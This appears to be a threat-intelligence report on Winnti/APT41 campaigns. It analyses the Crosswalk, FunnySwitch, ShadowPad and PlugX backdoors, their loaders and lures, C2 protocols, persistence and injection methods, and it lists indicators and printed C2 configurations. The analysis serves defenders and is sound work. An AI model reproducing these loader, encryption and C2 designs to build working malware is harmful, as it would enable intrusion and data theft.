On May 30, 2020, a new malicious archive, CV_Colliers.rar (df999d24bde96decdbb65287ca0986db98f73b4ed477e18c3ef100064bceba6d), was detected.
It had two shortcuts: Curriculum Vitae_WANG LEI_Hong Kong Polytechnic University.pdf.lnk International English Language Testing System certificate.pdf.lnk Their structure fully matched that of the samples from May 12.
In this case, the bait consisted of PDF documents with a CV and IELTS certificate.
Depending on which shortcut was opened, the output of ipconfig was sent to one of two addresses: http://goodhk.azurewebsites[.]net/inter.php or http://sixindent.epizy[.]com/inter.php. 
Note that all three intermediate C2 servers are on third-level domains on a free hosting service.
When accessed in a browser, each displays a different decoy page: Figure 4.
Page at zeplin.atwebpages_comFigure 5.
Page at goodhk.azurewebsites_netFigure 6.
Page at sixindent.epizy_comThese servers do not play a major role in the functioning of the malware; their precise purpose remains unknown.
It may be that the malware authors used this to monitor the success of the initial stages of infection, or else tried to lead security teams "off the scent" by masking the malware as a more minor threat. 
1.1 Attribution These attacks have been studied in detail by Malwarebytes and Zscaler.
Based on the similarity of the infection chains, researchers classify them as belonging to the Higaisa group. 
However, detailed analysis of the shellcode demonstrates that the samples actually belong to the Crosswalk malware family.
Crosswalk appeared no later than 2017 and was mentioned for the first time in a FireEye report on the activities of the APT41 (Winnti) group. 
Figure 7.
From the FireEye reportFigure 8.
Fragment of shellcode from 3t54dE3r.tmpThe network infrastructure of the samples overlaps with previously known APT41 infrastructure: at the IP address of one of the C2 servers, we find an SSL certificate with SHA-1 value of b8cff709950cfa86665363d9553532db9922265c, which is also found at IP address 67.229.97[.]229, referenced in a 2018 CrowdStrike report.
Going further, we can find domains from a Kaspersky report written in 2013. 
Figure 9.
Fragment of network infrastructureAll this leads us to conclude that these LNK file attacks were performed by Winnti (APT41), which "borrowed" this shortcut technique from Higaisa. 
1.2 Crosswalk Crosswalk is a modular backdoor implemented in shellcode.
The main component connects to a C2 server, collects and sends system information, and contains functionality for installing and running up to 20 additional modules received from the server as shellcode. 
The information collected by the module includes: OS uptime Network adapter IP addresses MAC address of one of the adapters Operating system version and whether it is 32-bit or 64-bit Username Computer name Name of running module PID Shellcode version and whether it is 32-bit or 64-bit (The shellcode supports both 32 and 64 bits.)
It has two-part version numbers; we found ones including 1.0, 1.10, 1.21, 1.22, 1.25, and 2.0. 
For more detailed analysis of one version of Crosswalk, see the VMware CarbonBlack investigation.
Based on version 1.25 (8e6945ae06dd849b9db0c2983bca82de1dddbf79afb371aa88da71c19c44c996), which was used in the attacks with LNK files, here we will describe the networking aspects of the malware in more detail. 
Crosswalk has broad capabilities for connecting to C2 servers.
The network configuration for this particular sample is at the end of the shellcode and is XOR encrypted with a 16-byte key.
The data structure is as follows: Configuration size (4 bytes) 
Key (16 bytes) Encrypted configuration The configuration, in turn, contains the following fields: 0x0 heartbeat interval (in seconds) 0x4 reconnect interval (in seconds) 0x8 bitmask for days of the week when connections may be made 0xC (inclusive) lower bound for time of day when connections may be made 0x10 (non-inclusive) upper bound for time of day when connections may be made 0x14 proxy port 0x18
proxy type 0x1C proxy host 0x9C proxy username 0x11C proxy password 0x19C number of C2 servers 0x1A0 array of structures of C2 servers A C2 server structure consists of the following fields: 0x0 connection type 0x4 port 0x8 whether DNS name resolution is necessary (yes/no) 0xC length of hostname 0x10 hostname Before attempting to connect, the backdoor checks whether the current day of the week and time match those allowed in the configuration.
Then, one after the other, it tries combinations of possible proxy servers (any indicated in the configuration plus system proxies) and C2 servers until it connects successfully. 
The communication protocol used between the backdoor and C2 server can be separated logically into two levels: Application-level protocol Transport-level protocol On the application level, messages consist of the following fields: FakeTLS header consisting of 5 bytes: Entry type and protocol version (3 bytes).
For the client these always equal 17 03 01; for the server, they have random values. 
Data length, not including header (2 bytes) Message contents: Command ID (4 bytes, little-endian) Command data size (4 bytes, little-endian) Client ID (36 bytes), generated based on the UUID when the backdoor starts operation Command data The first two client–server and server–client messages have command IDs 0x65 and 0x64, respectively.
They contain the data that will then be used to generate the client and server session keys.
The key generation algorithm is detailed in a Zscaler report.
For all subsequent messages, the content (not including the FakeTLS header) is transferred in the corresponding encrypted session key. AES-128 is the encryption algorithm used. 
The transport-level protocol depends on the connection type indicated in the configuration.
Four protocols are supported: Standard TCP connection Application-level messages are sent unchanged as TCP segments. 
Equivalent to HTTP Long Polling The client creates two TCP connections.
The first will be used to get packets from the server, and the second to send them. 
During the first connection, a GET request is sent to the C2 server.
The server replies with headers with code 200 and Content-Length: 524288000.
The subsequent stream of application-level messages from the server to the client is sent as the body of an HTTP response. 
Figure 10.
First HTTP connection with C2After the correct response headers are received, the malware establishes a second connection to the same port, where a POST request is made.
The header dCy is generated by the client based on the UUID and, it would seem, serves as the session ID that links the two connections.
After receipt of a response with code 200, subsequent messages from the client to the server are sent using separate POST requests. 
Figure 11.
Second HTTP connection with C2 Duplication of socket with TLS connection The client establishes a TCP connection and sends an HTTPS request like the following one: GET /msdn.cpp HTTP/1.1 Connection: Keep-Alive User-Agent: WinHTTP/1.1 Content-Length: 4294967295 Host:
149.28.152[.]196 
The HTTPS connection is not used again.
Subsequent messages are exchanged in the original TCP connection (without TLS encryption).
Subsequent communication between the client and server occurs via protocol 1, except for when, at the beginning of the session, the client sends two packets with the FakeTLS header, which starts with the sequence 17 03 01.
The first packet always has length 0.
The second has length 0x3A, 0x3C, 0x3E, or 0x40 and contains random bytes.
We were unable to determine the purpose of these packets. 
Figure 12.
Additional packets with FakeTLS header KCP protocol This protocol can be implemented on top of any other protocol (including UDP) to ensure quick and reliable data transfer.
The Crosswalk client uses KCP on top of a TCP connection: KCP protocol data is added to application-level messages that are then sent as TCP segments. 
Figure 13.
Crosswalk message with KCP headers (highlighted in yellow) Note that in the Crosswalk samples we detected, none of the samples used the KCP protocol in practice.
But the code contains a full-fledged implementation of this protocol, which could be used in other attacks: the developers would simply need to set this connection type in the configuration. 
The diversity of protocols and techniques would seem to protect the backdoor from network traffic inspection. 
2. Loaders and injectors Investigation of network infrastructure and monitoring of new Crosswalk samples put us onto the scent of other malicious objects containing Crosswalk shellcode as their payload.
We can categorize these objects into two groups: local shellcode loaders and injectors.
Some of the samples in both groups are also obfuscated with VMProtect. 
2.1 Injectors Figure 14.
Code for injecting shellcode into a running processThe injectors contain typical code that obtains SeDebugPrivilege, finds the PID of the target process, and injects shellcode into it.
Depending on the sample, explorer.exe and winlogon.exe are the target processes. 
The samples we found contain one of three payloads: Crosswalk Metasploit stager FunnySwitch (discussed later in this report) Crosswalk and FunnySwitch shellcode is located in the data sections "as-is," while the samples with Metasploit show additional XOR encryption with the key "jj1". 
2.2 Local shellcode loaders The main function of the malware is to extract shellcode and run it in an active process.
The malware samples belong to one of two categories, based on the source of shellcode that they use: in the original executable or in an external file in the same directory. 
Most of the loaders start by checking the current year, much like the samples from the LNK file attacks. 
Figure 15.
Code of the loader's main functionAfter the malware finds the API functions it needs, it decrypts the string Global\0EluZTRM3Kye4Hv65IGfoaX9sSP7VA with the ChaCha20 algorithm.
In one older version, to prevent being run twice the loader creates a mutex with the name Global\5hJ4YfUoyHlwVMnS1qZkd2tEmz7GPbB. But in recent samples, the decrypted string is not used in any way.
Perhaps part of the code was accidentally deleted during the development process. 
Another artifact found in some samples is the unused string CSPELOADKISSYOU.
Its purpose remains unclear. 
Figure 16.
String "CSPELOADKISSYOU" in data sectionIn the self-contained loaders, the shellcode is located in a PE file overlay.
The shellcode is stored in a curious way: data starts from 0x60 bytes of the header, followed by the (encrypted) shellcode.
The data length is stored at offset –0x24 from the end of the executable.
The header always starts with the PL signature.
The other header data is used for decryption: a 32-byte key is located at offset 0x28 and a 12-byte nonce for the ChaCha20 algorithm is at offset 0x50. 
Figure 17.
Handling of PL shellcode in the loader body (ChaCha20)The ChaCha20 implementation is not always present: some of the samples use Microsoft CryptoAPI with AES-128-CBC for encryption.
We can also find key information here in the structure of the PL shellcode: at offset 0x28, there are 32 bytes that are hashed with MD5 to obtain a cryptographic key. 
Figure 18.
Handling of PL shellcode in the loader body (AES-128)Older loader versions use Cryptography API:
Next Generation (BCrypt* functions) in an equivalent way.
They use AES-128 in CFB mode as the encryption algorithm. 
The loaders that rely on external files have a similar code structure and one of two encryption types: ChaCha20 or AES-128-CBC.
The file should contain PL shellcode of the same format as in the self-contained loader.
The name depends on the specific sample and is encrypted with the algorithm used in it.
It can contain a full file path (although we did not detect any such samples) or a relative path. 
Figure 19.
Building the file name with PL shellcodeAmong all the loaders, we encountered three different shellcode payloads: Crosswalk Metasploit stager Cobalt Strike Beacon 2.3 Attack examples 2.3.1 An encrypted resume This malicious file is a RAR archive, electronic_resume.pdf.rar (025e053e329f7e5e930cc5aa8492a76e6bc61d5769aa614ec66088943bf77596), with two files: Figure 20.
Contents of electronic_resume.pdf.rarThe first file might look like bait, but trying to open it in a PDF viewer gives an error, since it is practically a copy of the latter. 
The file Электронный читатель резюме.exe ("Electronic reader resume.exe") is an executable self-contained loader for PL shellcode.
It contains Cobalt Strike Beacon as the payload. 
Figure 21.
Configuration of Cobalt Strike BeaconThe archive was distributed on approximately June 1, 2020, from the IP address 66.42.48[.]186 and was available at hxxp://66.42.48[.]186:65500/electronic_resume.pdf.rar.
The same IP address was used as C2 server. 
The modification time of the archive files, as well as the date on which the archive was found the server, point to the attack being active in late May or early June.
The Russian filenames suggest that the targets were Russian-speaking users. 
2.3.2 I can't breathe The attack is practically identical to the previous one: malware is distributed in a RAR archive video.rar (fc5c9c93781fbbac25d185ec8f920170503ec1eddfc623d2285a05d05d5552dc) and consists of two .exe files.
The archive is available on June 1 on the same server at the address hxxp://66.42.48[.]186:65500/video.rar. Figure 22.
Contents of video.rarThe executable files are self-contained loaders of Cobalt Strike Beacon PL shellcode with a similar configuration and the same C2 server. 
The bait is notable for the topic: the hackers were attempting to exploit U.S. protests related to the death of George Floyd.
The main bait was a video with the name "I can't breathe-America's Black Death protests that the riots continue to escalate and ignite America!.mp4" involving reporting on protests in late May, 2020.
Judging by the logo, the source of the video was Australian portal XKb, which releases news materials in Chinese. 
Figure 23.
Still frame from the bait video2.3.3
Chat transcript The archive запись чата.7z ("chat transcript.7z") (e0b675302efc8c94e94b400a67bc627889bfdebb4f4dffdd68fdbc61d4cd03ae) contains three identical executable files with names resembling "запись чата-1.png____________________________________.exe" ("chat transcript-1.png____________________________________.exe") in attacks again targeting Russian-speaking users. 
Figure 24.
Contents of the archive, the name of which promises a "chat transcript"The malicious files are self-contained PL shellcode loaders, but the payload here is Crosswalk version 2.0. 
Its configuration implies three ways to connect to the C2 server at 149.28.23[.]32: Transport protocol 3, port 8443 Transport protocol 2, port 80 Transport protocol 1, port 8080 Figure 25.
Fragment of the Crosswalk configuration3.
Attacks on Russian game developers The Winnti group first became famous for its attacks on computer game developers.
Such attacks continue today, and Russian companies are also among their targets. 
3.1 Unity3D Game Developer from St. Petersburg 
The attack is based on the archive Resume.rar (4d3ad3ff281a144d9a0a8ae5680f13e201ce1a6ba70e53a74510f0e41ae6a9e6), which contains just one file: CV.chm. Running the file without security updates installed causes two windows to appear simultaneously: CHM help in HTML Help and a PDF document.
They contain the same information: a curriculum vitae for the position of game developer or database manager at a St. Petersburg company. 
The CV contains plausible contact information, with a St. Petersburg address, email address ending with "@yandex.ru", and phone number starting with "+7" (Russia's country code).
The only obviously fake aspect is the phone number: 123-45-67. Figure 26.
Result of opening the CHM fileThe PDF file opens due to the script pass.js, which is contained in the CHM file and referenced in the code of the HTML page. 
Figure 27.
Reference to pass.js in HTML codeThe script uses a technique for running an arbitrary command in a CHM file via an ActiveX object.
This unpacks an HTML help file to the folder C:\Users\Public for launching the next stage of the infection: the file resume.exe, which is also embedded inside the CHM file. 
Figure 28.
Deobfuscated script pass.jsresume.exe is an advanced shellcode injector of which we had encountered only one sample as of the writing of this article.
Before it gets down to business, this malware, like many other samples we have seen from Winnti, checks the current year.
Current processes are checked and the malware will not run if any of the following are active: ollydbg.exe|ProcessHacker.exe|Fiddler.exe|windbg.exe|tcpview.exe|idaq.exe|idaq64.exe|tcpdump.exe|Wireshark.exe. 
On first launch, shellcode will be taken from MyResume.pdf; on subsequent launches, winness.config is the shellcode source. 
Figure 29.
Main function in resume.exeMyResume.pdf is unpacked from the CHM file.
Data read by resume.exe has been added to the end of the PDF file.
If the user opens it directly, a message warns that the document is password-protected. 
Figure 30.
MyResume.pdf, as viewed in Adobe Acrobat ReaderCompared to the PL shellcode, the data structure is more complex and contains the following: 
ROR-13 hash of data starting from byte 0x24 (0x20, 4 bytes) Nonce for algorithm ChaCha20 (0x24, 12 bytes) ChaCha20-encrypted text (0x30): Name of PDF file (+0x0) 
Size of PDF file (+0x20) Size of auxiliary shellcode (+0x24) Size of main shellcode (+0x28) Constant 0xE839E900 (+0x2C) PDF file Auxiliary shellcode Main shellcode On first launch of resume.exe, the encrypted portion of the data is decrypted (the key is hard-coded in the executable) and three sections are extracted (PDF, auxiliary shellcode, and main shellcode).
The PDF file is saved with a name resembling _797918755_true.pdf in a temporary folder.
It then opens for the user (the second window in the screenshot on Figure 26, next to HTML Help). 
Figure 31.
resume.exe: actions on first launchThe payload runs in a new process %windir%\System32\spoolsv.exe, into which the main shellcode is injected: Cobalt Strike Beacon with C2 address 149.28.84[.]98. 
Injection occurs by creating a section via a ZwCreateSection call, getting access to it from the parent and child processes via ZwMapViewOfSection calls, copying shellcode to the section, and placing a jump to the shellcode at the entry point for spoolsv.exe. 
For persistence, resume.exe (under the name winness.exe) is copied to the folder %appdata%\Microsoft\AddIns\ and the main shellcode is re-encrypted and saved in the same location, with the name winness.config.
To ensure autostart, auxiliary shellcode writes the file svchost.bat, which transfers control to winness.exe, to the startup folder.
For avoiding detection at this stage, the auxiliary shellcode is injected in a similar way into spoolsv.exe, independently loads the necessary functions, and writes to file in a separate thread. 
When winness.exe runs after a restart, the main shellcode is decrypted from winness.config and injected into spoolsv.exe in exactly the same way. 
3.2 HFS with a surprise Figure 32.
HFS server on Winnti infrastructureOn June 23, 2020, while investigating Winnti network infrastructure, we detected an active HttpFileServer on one of the active C2 servers.
Four images were there for all to see: an email icon, screenshot from a game with Russian text, screenshot of the site of a game development company, and a screenshot of information about vulnerability CVE-2020-0796 from the Microsoft website. 
Figure 33.
13524222881554126454-128.pngFigure 34.
EaVpPBNXgAE8s3r.jpgFigure 35.
website_battlestategames.pngFigure 36.
windows_update.pngThe screenshots related to Battlestate Games, the St. Petersburg-based developer of Escape from Tarkov. 
Almost two months later, on August 20, 2020, the file CV.pdf____________________________________________________________.exe (e886caba3fea000a7de8948c4de0f9b5857f0baef6cf905a2c53641dbbc0277c) was uploaded to VirusTotal.
This file is a self-contained loader for Cobalt Strike Beacon PL shellcode. 
Its C2 server is interesting: update.facebookdocs[.]com. 
We discovered that the main domain facebookdocs[.]com hosted a copy of the official site of Battlestate Games: www.battlestategames.com.
Via an associated C2 IP address (108.61.214[.]194), we found an equivalent page on the phishing domain www.battllestategames[.]com (note the double "l"). 
Figure 37.
Copy of the official Battlestate Games siteWhen used as C2 servers, such domains give attackers the ability to mask malicious traffic as legitimate activity within the company. 
The combination of these two finds makes us think that we detected traces of preparation for, and subsequent successful implementation of, an attack on Battlestate Games. 
Moreover, the match between the job listing for Unity3D developer (as seen in the screenshot from the official site) and contents of the curriculum vitae in the file CV.chm (as described in the previous section), considering how closely they matched in time as well as the company and "applicant" both being located in St. Petersburg, suggests a connection between these attacks.
Most likely, the CHM file attack was used at the beginning stage of the breach, although we do not have solid confirmation for this. 
Use of typosquatting domains for C2 servers is typical of Winnti and has been described in a Kaspersky report. 
Battlestate Games received all of the information uncovered by our investigation into the suspected attack. 
4.
A purloined certificate Another favorite Winnti technique is theft of certificates for code signing.
Compromised certificates are used to sign malicious files intended for future attacks. 
We found one such certificate belonging to Taiwanese company Zealot Digital: Name: ZEALOT DIGITAL INTERNATIONAL CORPORATION Issuer: 
GlobalSign CodeSigning CA - SHA256 - G2 Valid From: 07:43 AM 08/20/2015 
Valid To: 07:43 AM 09/19/2016 Valid Usage: Code Signing Algorithm: sha256RSA Thumbprint: 91e256ac753efe79927db468a5fa60cb8a835ba5 Serial Number: 112195a147c06211d2c4b82b627e3d07bf09 
The files signed with it were predominantly used in attacks on organizations in Hong Kong.
They include Crosswalk and Metasploit injectors, the juicy-potato utility, and samples of FunnySwitch and ShadowPad. 5.
FunnySwitch Among the files signed with the Zealot Digital certificate, we discovered two samples of malware containing a previously unknown backdoor.
We have called it FunnySwitch, based on the name of the library and one of the key classes.
The backdoor is written in .NET and can send system information as well as run arbitrary JScript code, with support for six different connection types, including the ability to accept incoming connections.
One of its distinguishing features is the ability to act as message relay between different copies of the backdoor and a C2 server. 
5.1 Unpacking The attack in question starts with the SFX archive x32.exe (2063fae36db936de23eb728bcf3f8a5572f83645786c2a0a5529c71d8447a9af). 
Figure 38.
Contents of the archive x32.exeThe archive unpacks three files (1.vbs, n3.exe, and p3.exe) into the folder c:\programdata, after which the extracted VBS script runs both executables. 
The files n3.exe and p3.exe are identical and inject shellcode into the process explorer.exe.
The only difference between them is the final bytes of the shellcode they inject, which contain the XML configuration.
In one case, the proxy server 168.106.1[.]1 is specified there in addition: <?xml version="1.0" encoding="utf-8"?> <Config Group="aa" Password="test" StartTime="0" EndTime="24" WeekDays="0,1,2,3,4,5,6"> <HttpConnector url="http://db311secsd.kasprsky[.]info/config/" proxy="http://168.106.1[.]1/" interval="30-60"/> </Config> <?xml version="1.0" encoding="utf-8"?> <Config Group="aa" Password="test" StartTime="0" EndTime="24" WeekDays="0,1,2,3,4,5,6"> <HttpConnector url="http://db311secsd.kasprsky[.]info/config/" interval="30-60"/> </Config> 
A subdomain of kasprsky[.]info, db311secsd.kasprsky[.]info, is the C2 domain.
Interestingly, several of its other subdomains are mentioned in an FBI report.
It dates to May 21, 2020, and warns of attacks on organizations linked to COVID-19 research. 
The job of the shellcode is to launch and execute a method from the .NET assembly located immediately after its code.
To do so, it gets a reference to the ICorRuntimeHost interface, which it uses to run CLR and create an AppDomain object.
The contents of the assembly are loaded into the newly created domain.
Reflection is used to run the static method Funny.
Core.
Run(xml_config), to which the XML configuration is passed. 
Figure 39.
Calling a method from the .NET
assemblyThe assembly is the library Funny.dll with obfuscation by ConfuserEx. 5.2 Funny.dll The backdoor starts by parsing the configuration.
Its root element may contain the following fields: Debug is the flag for enabling debug logging Group is an arbitrary string sent together with system information. 
Password is the key used to encrypt messages. 
ID identifies the relay (if not present in the configuration, the GUID is used instead). 
StartTime, EndTime, and WeekDays restrict the times and days when the backdoor may function The <Config> element may contain an arbitrary number of elements describing various types of connectors: TcpConnector and TcpBindConnector are classes responsible for connecting over TCP as client and server. 
They have two parameters in common: address and port (by default, 38001).
TcpConnector also has the parameter interval, which indicates how long to wait before trying to reconnect. 
HttpConnector and HttpBindConnector are HTTP client with support for proxy and HTTP server. 
Supported client parameters: url – address to connect to, interval – same as at TcpConnector, proxy and cred – proxy server address and credentials.
Server parameters: url – list of prefixes on which it will run and timeout – client timeout. 
The standard classes HttpWebRequest and HttpListener from .NET
Framework are used for client and server implementations.
Both HTTP and HTTPS are supported: if no SSL certificate is configured for the port on which the server is running, it will be launched with CN = Environment.
MachineName + ".local.domain".
The client, in turn, ignores certificate validation. 
RPCConnector and RPCBindConnector are classes that allow setting up a connection via a Named Pipe.
They take a single parameter, name, which is the name of the connection. 
TcpBindConnector and HttpBindConnector support simultaneous connections for multiple clients. 
For the network connectors to work, the backdoor adds an allow rule to Windows Firewall with the name "Core Networking ― IPv4" for its executable module. 
Figure 40.
Code for adding Windows Firewall rulesJust like with Crosswalk, there are multiple levels of the protocol: in this case, transport, network, and application. 
5.2.1 Transport protocols TCP TCP supports three types of messages: PingMessage (0x1), PongMessage (0x2), and DataMessage (0x3).
The first two monitor the connection and are relevant only at the TcpConnector/TcpBindConnector level.
DataMessage contains network-level data. 
Messages consist of a signature (4 bytes), encrypted header (16 bytes), and optional data. 
The signature is three random bytes followed by their sum with modulo 256.
Incoming messages with an invalid signature are discarded. 
The header contains the data size (4 bytes) and byte indicating the message type (0x1, 0x2, or 0x3). 
It is encrypted with AES-256-CBC; the key and IV are taken from the MD5 of the key string.
The backdoor uses this encryption method in other cases as well, which is why we refer to it as "standard" in the text that follows.
The key string in this case is "tcp_encrypted". 
Figure 41.
Standard encryption in FunnySwitch HTTP with long polling There are three types of requests: GET "connect", GET "pull", and POST "push".
To start transferring data, the client must connect by sending a GET request to a URL from the configuration and provide a special cookie value. 
The cookie name is eight random characters.
The value is an encrypted Base64 string containing the session GUID and operation name ("connect").
The string is encrypted in the standard way with the key "http". 
The client then constantly sends GET requests with pull operations.
In response, the server returns the relevant array of messages for the client or, if no new messages have arrived in the last 10 seconds, an empty response.
Client–server messages are periodically sent as an array as well, for which a POST request with push operation is used. 
Figure 42.
FunnySwitch connect and pull requestsThe special class MsgPack class, which implements a custom serialization protocol, unpacks the array and other primitive types. 
RPC (Pipe) Similar to TCP, except for the absence of connection monitoring. 
5.2.2 Network-level protocol Figure 43.
Function for processing incoming network-level communicationsAll messages at this level are encrypted in the backdoor's standard way, with the key string "commonkey". 
Messages are an array of three or four elements: Message type ("hello_request", "hello_response", "message", "error") Source serialized array Destination serialized array Payload (application-level data) 
The MsgPack class is also used for serialization.
The Source and Destination arrays contain the IDs of the relays through which the message has already passed and the IDs of the routers through it should be delivered to the recipient. 
The bodies of hello_request and hello_response messages contain information about the sender's system.
When one of these messages is received, the relay saves data about the sender ID, used connector instance and system data.
These message types are used to establish a direct connection between relays. 
Messages of the "message" type (ones that are not hello_request, hello_response, or error) can be passed via several relays.
If its Destination field contains only the ID of the current instance, it will be handled locally; if not, it will be sent to the next relay in the list.
For connecting to the next instance, it uses the connector that was saved when exchanging hello_request and hello_response messages. 
The backdoor collects the following system information: Values of the registry keys ProductName and CSDVersion from HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion Whether the OS is 32-bit or 64-bit List of IP addresses Computer name Username and workgroup Name of running module PID MAC addresses of network adapters Value of the Group attribute in the XML configuration 5.2.3 Application-level protocol At the application level, data is encrypted in the standard way using the value of the Password attribute from the configuration.
If no such value exists, the key string is "test".
Data is compressed with GZip prior to encryption. 
After decryption and decompression, the payload is an array (packed MsgPack) consisting of one or two elements: a string with the name of a command and optional array of bytes (data for the command).
These elements, in turn, contain another serialized array, which contains a message string ID (which will be used to send the result of the command) plus the data for the command. 
5.2.4 Supported commands Command Description invoke Run JScript code and get the result.
Implementation was separated out into a JSCore .NET assembly, which is dynamically loaded from a Base64 constant defined in the main assembly. 
Figure 44.
Loading the Funny.
Eval class from the JSCore assemblyCode execution is accomplished with classes from the Microsoft.
JScript namespace. 
Figure 45.
Code fragments from the Funny.
Eval class connect Takes an XML string with connector configuration and creates the corresponding object. 
update Packs a response containing the IDs of relays connected to the current copy, together with their system information. 
query Collects the configuration of active connector instances other than the RPCConnector and RPCBindConnector classes. 
remove Removes the specified connector. 
createStream Creates a message queue with the indicated name.
The queue connects with the sender of the createStream command. 
closeStream Deletes the named message queue. 
sendStream Adds a message (byte array) to the queue with the specified name. 
The result of execution of each command is returned to the sender via the invoke-response command. 
5.2.5 Unused code By all appearances, the FunnySwitch backdoor is still under development, as shown by the incomplete state of message queue functionality.
Besides the commands described here already, the code contains the functions PullStream and SendStream, which are not used anywhere.
The first extracts a message from the queue (by queue name), while the second sends its creator an arbitrary set of bytes with the stream-data command. 
The code also contains several unused classes: an implementation of the KCP protocol, limited-size queue SizeQueue, and string serializer StreamString. Figure 46.
Fragment of KCP class code5.2.6 FunnySwitch vs. Crosswalk Based on investigation of the two backdoors, we believe that they were written by the same developers.
Several things point at common authorship: Use of multiple transport protocols Support for specifying a proxy server Identical configuration restrictions on time of day and days of the week Implementation of the KCP protocol Implemented (and disabled by default) logging of debug messages and errors Figure 47.
Error logging in CrosswalkFigure 48.
Message logging in FunnySwitch6.
ShadowPad During the investigation we also discovered two samples containing ShadowPad malware. 
The first of these is the SFX archive 20200926___Request for wedding reception.exe (03b7b511716c074e9f6ef37318638337fd7449897be999505d4a3219572829b4). 
Figure 49.
Contents of the archive 20200926___Request for wedding reception.exeFor bait, it contains a Chinese-language Microsoft Word document with the text of a wedding banquet form. 
Figure 50.
Bait file wedding.docxThe archive contents are unpacked to the folder c:\programdata, from where (besides the bait file being opened) the payload log.exe is launched. 
Both the executable file and the DLL library are obfuscated with VMProtect, but we also found identical unprotected versions (as shown in the following screenshots). 
An unpacked legitimate component of Bitdefender (386eb7aa33c76ce671d6685f79512597f1fab28ea46c8ec7d89e58340081e2bd) serves as log.exe.
It dynamically loads the library log.dll. 
Figure 51.
Loading log.dll in log.exeThe library, in turn, when loaded checks for whether the current module contains a certain set of bytes at offset 0x2775.
If the loading module meets its expectations, these bytes change to a call instruction for a DLL function.
As a result, in log.exe right after log.dll loads, a call is made to the function sub_100010D0.
The called function is not explicitly exported. 
Figure 52.
Check and modification of executable module in log.dllA similar technique has been previously described by ESET in the context of Winnti attacks on universities in Hong Kong.
ShadowPad malware was used as the payload in these attacks. 
In our case, the code run afterwards had been obfuscated with a new approach: all functions are split into separate instructions that shuffle between each other.
Jumps between instructions occur by means of calls to a special function (rel_jmp), which emulates the jmp command.
The offset at which the jump occurs is written immediately after a call instruction (see the following figure). 
Figure 53.
Structure of obfuscated codeIn addition, to obfuscate the control flow in the code, conditional jumps that never run are included as well: cmp esp, 3181h jb loc_1000BCA9 The obfuscated code is the loader for the subsequent shellcode, which is encrypted in the file log.dll.dat.
After decryption, the file is deleted and the shellcode is re-encrypted, saved in the registry, and run.
When log.exe is launched subsequently, the shellcode will be loaded from the registry. 
The data is stored in a hive with a name resembling the following: (HKLM|HKCU)\Software\Classes\CLSID\{%8.8x-%4.4x-%4.4x-%8.8x%8.8x}, in key %8.8X.
The values inserted in the formatting strings are generated based on the TimeDateStamp in the PE header of log.dll, and therefore are always identical for any given library copy.
In our case, they equal {56a36bd2-5e2b-20b0-96f2cb9bb3f43475} and EB5D1182, respectively. 
The payload is ShadowPad shellcode that has been obfuscated with the same rel_jmp and fake-jb techniques.
The following strings are contained in its encrypted configuration: 6/30/2020 1:25:52 PM ccc %ProgramData%\ msdn.exe log.dll log.dll.dat WMNetworkSvc WMNetworkSvc WMNetworkSvc SOFTWARE\Microsoft\Windows\CurrentVersion\Run 
WMSVC %ProgramFiles%\Windows Media Player\wmplayer.exe %windir%\system32\svchost.exe %windir%\system32\winlogon.exe %windir%\explorer.exe TCP://cigy2jft92.kasprsky.info:443 
UDP://cigy2jft92.kasprsky.info:53 SOCKS4 SOCKS4 SOCKS5 SOCKS5 They include the likely data of module assembly (June 6, 2020), name of the service used by the malware to gain persistence on the system (WMNetworkSvc), names of processes into which shellcode can be injected, and the C2 domain cigy2jft92.kasprsky[.]info. 
As we wrote earlier, the other domain kasprsky[.]info has been used by attackers as a FunnySwitch C2 server.
Investigation of subdomains and IP addresses yields another second-level domain, livehost[.]live, whose subdomain d89o0gm35t.livehost[.]live is indicated as a C2 server in one copy of Crosswalk (86100e3efa14a6805a33b2ed24234ac73e094c84cf4282426192607fb8810961).
Moreover, all samples of these backdoors were signed with the stolen Zealot Digital certificate and were likely used together as part of a single campaign. 
This is not the only example of a connection between the Crosswalk and ShadowPad network infrastructures.
Two Crosswalk C2 servers we found, 103.248.21[.]134 and 103.248.21[.]179, contained an SSL certificate with SHA-1 value of b1d749a8883ac9860c45986e2ffe370feb3d9ab6.
The same certificate was noted at IP address 103.4.29[.]167, which via the domain update.ilastname[.]com was used as a C2 server for another copy of ShadowPad (37be65842e3fc72a5ceccdc3d7784a96d3ca6c693d84ed99501f303637f9301a). 
Figure 54.
Fragment of ShadowPad and PlugX infrastructure7.
PlugX The SSL certificate pointed us to another C2 server, with the domain ns.mircosoftbox[.]com. 
We found that this C2 server is used by an interesting copy of the PlugX backdoor.
Its core is typical of PlugX, being an SFX archive (ccdb8e0162796efe19128c0bac78478fd1ff2dc3382aed0c19b0f4bd99a31efc) that contains the library mapistub.dll, which loads as a legitimate executable. 
Figure 55.
PlugX SFX archiveBut mapistub.dll is only a downloader.
Google Docs is used to store the payload: the library sends a request to export a certain document in .txt format, decodes it into shellcode with Base64, and runs it. Figure 56.
Loading and running shellcode in mapistub.dllThe shellcode has been obfuscated with junk instructions and inverted conditional jumps (combinations of jle/jg and the like).
Its job is to decrypt and run the next stage, which is responsible for reflective loading of the main PlugX component and passing the structure with the configuration to it. 
Figure 57.
Obfuscated shellcode from Google DocsThis process and what the similar sample does after that are described in more detail in a report from Dr.Web (QuickHeal shellcode and BackDoor.PlugX.28). 
Besides the C2 servers in the configuration file, 103.79.76[.]205 and ns.mircosoftbox[.]com, in our case the attackers also used a technique typical of PlugX for getting a C2 server at a specified URL.
The C2 address is encoded in the page body between the DZKS and DZJS markers. 
Again, the address of a Google Docs document is used as the URL. 
Figure 58.
Document with encoded
URLNote that the document is editable without logging in.
But when we accessed it for the first time, it had the IP address 107.174.45[.]134, which is related to the domain dc-d68d34331440.mircosoftbox[.]com and, apparently, had been put in place by the attackers. 
A similar technique has been used by Winnti in the past: according to Trend Micro, an encoded C2 address was stored in GitHub repositories in 2017. 
7.1 Paranoid PlugX We were able to detect an additional copy of PlugX that contained shellcode fully identical to that downloaded from Google Docs, except for the encrypted configuration. 
It, too, is an SFX archive (94ea23e7f53cb9111dd61fe1a1cbb79b8bbabd2d37ed6bfa67ba2a437cfd5e92) but with different files inside. 
Figure 59.
Contents of the SFX archiveWhen unpacked, the archive runs the script 1.vbs, which in turn passes control to a.bat. Figure 60.
Contents of a.batThe main payload is in the file image.jpg, which is actually a specially crafted .NET assembly.
The assembly launches with the help of InstallUtil.exe from .NET Framework, enabling it to bypass application allowlist restrictions. 
Figure 61.
Running shellcode in image.jpgThe purpose of image.jpg is to run the same PlugX shellcode with the help of CreateThread. 
